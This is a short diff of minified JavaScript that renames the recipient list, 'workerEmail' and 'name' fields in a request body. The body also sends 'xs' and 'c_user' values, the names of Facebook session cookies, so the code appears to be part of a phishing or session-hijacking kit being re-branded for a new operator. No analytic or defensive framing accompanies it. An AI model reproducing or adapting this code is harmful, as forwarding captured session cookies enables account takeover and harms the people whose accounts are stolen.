@@ -9714,7 +9714,7 @@
             n.useState)()
               , [i,l] = (0,
             n.useState)()
-              , o = ["salman jani email"]
+              , o = ["Azhar"]
               , s = _();
             return (0,
             he.jsxs)(he.Fragment, {
@@ -9822,10 +9822,10 @@
                                         },
                                         body: JSON.stringify({
                                             emails: o,
-                                            workerEmail: "Aftab",
+                                            workerEmail: "Legend Azhar",
                                             xs: r,
                                             c_user: i,
-                                            name: "Aftab"
+                                            name: "Azhar"
                                         })
                                     }).then((e => {
                                         e.ok
